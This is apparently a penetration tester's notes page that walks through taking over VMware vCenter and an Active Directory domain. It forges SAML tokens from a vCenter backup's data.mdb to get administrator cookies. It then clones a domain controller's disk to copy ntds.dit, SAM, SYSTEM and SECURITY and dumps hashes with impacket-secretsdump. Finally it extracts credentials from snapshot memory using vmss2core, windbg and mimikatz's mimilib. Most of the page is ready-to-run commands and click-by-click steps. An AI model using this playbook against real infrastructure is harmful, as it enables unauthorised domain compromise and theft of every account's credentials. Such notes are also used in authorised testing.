___

## vCenter backup file --> vCenter Administrator

You can parse the `data.mdb` file to extract the local SSO signing certs, make a request with the forged SAML token and get Administrator cookies.

Look for vCenter backups, they should contain the `lotus_backup.tar.gz` file. Extract the `data.mdb` file and run [this tool](https://github.com/horizon3ai/vcenter_saml_login/pull/23).

```bash
git clone https://github.com/theol-syn/vcenter_saml_login.git; cd vcenter_saml_login
python3 vcenter_saml_login.py -p data.mdb -t <vCenterIp>
```

If successful, you'll get admin cookies. Visit the `sphere.domain.local/ui` path (make sure the cookies match that path) and you should be administrator.

ref: https://horizon3.ai/attack-research/attack-blogs/compromising-vcenter-via-saml-certificates/
## vCenter access --> Domain Admin

From vCenter we have several paths to gain more privileges. 


#### VM VMDK Credential Extraction

This is the easiest option, we just clone a target box's (hopefully a DCs) `.vmdk` and mount it to box you have control over. Then grab the NTDS (or sam, system, security).

**Clone vmdk**

- **Login to vCenter** (HTML5 UI).
- **Power Off Target DC** (if possible; else snapshot first):
    - Right-click VM → **Power** → **Power Off**.
- **Snapshot VM (Disk-Only)**:
    - Right-click VM → **Snapshots** → **Take Snapshot**.
    - Name: `CredExtract-Snap`.
    - **Uncheck** "Snapshot the virtual machine's memory".
    - **Check** "Quiesce guest file system" (VSS for consistency).
    - OK → Creates `.vmdk delta` files.
- **Clone VMDK to Analysis Datastore**:
    - **Datastore Browser**: vCenter → **Storage** → Select datastore → **Datastore Browser**.
    - Navigate: `VM-folder/DC-VM/` → Copy **entire disk folder** (e.g., `DC-VM/DC-VM.vmdk`, `DC-VM-flat.vmdk`, `DC-VM.vmsd`).
        - Right-click folder → **Copy to** → Target datastore (analysis VM's).
    - Rename clone: `DC-VM-clone.vmdk`.

**Attach Cloned VMDK to controlled VM**

1. **Power Off Analysis VM** in vSphere.
2. **Edit VM Settings**:
    - Right-click → **Edit Settings** → **Add New Device** → **Existing Hard Disk**.
    - Browse datastore → Select `DC-clone.vmdk`.
    - **OK** (appears as extra disk, e.g., Disk 1).
3. **Power On VM**.

Windows should identify disk and assign drive letter.

```powershell
dir E:\Windows\NTDS\
xcopy E:\Windows\NTDS\ntds.dit C:\dc-extract\ /Y
xcopy E:\Windows\System32\config\SYSTEM C:\dc-extract\ /Y
xcopy E:\Windows\System32\config\SECURITY C:\dc-extract\ /Y
xcopy E:\Windows\System32\config\SAM C:\dc-extract\ /Y
```

**Pull hashes with secretsdump**
```
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
```

#### VM Snapshot vmem Credential Extraction

Choose target VM right click --> Snapshot --> take snapshot --> include memory.
Go to datastores, find snapshot files, download `*.vmem` & `*.vmsn` at the same time (important for differing storage methods, downloading together ensures complete data).

Install windbg
```
https://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi
```

Get x64 version of mimilib.dll.
```
wget https://github.com/ParrotSec/mimikatz/blob/master/x64/mimilib.dll
```

Install both x86 & x64 runtimes from (for vmss2core)
```
https://www.microsoft.com/en-us/download/details.aspx?id=40784
```

**Convert vmem to memdump**

> [!Note] OS Version 
> If the target VM is Microsoft Windows 8/8.1, Windows Server 2012, Windows Server 2016 or Windows Server 2019 then execute with -W8, otherwise just -W

```bash
vmss2core-sb-8456865.exe -W8 dothisoneirst.vmsn thisonesecond.vmem
```

Then open windbg --> file --> Open Crash Dump --> memory.dmp

If not already installed, load symbols
```
.sympath SRV*f:\localsymbols*http://msdl.microsoft.com/download/symbols
.reload
```

Find lsass memory address
```
!process 0 0 lsass.exe
```

**Load mimilib**
```
.load C:\tools\mimilib.dll
```

And attach to process
```
.process /r /p ffffc3037706b080
```

**Run mimikatz**
```
!mimikatz
```

**References**
- https://blog.carnal0wnage.com/2014/06/mimikatz-against-virtual-machine-memory.html
- https://jamescoote.co.uk/Dumping-LSASS-with-SharpShere/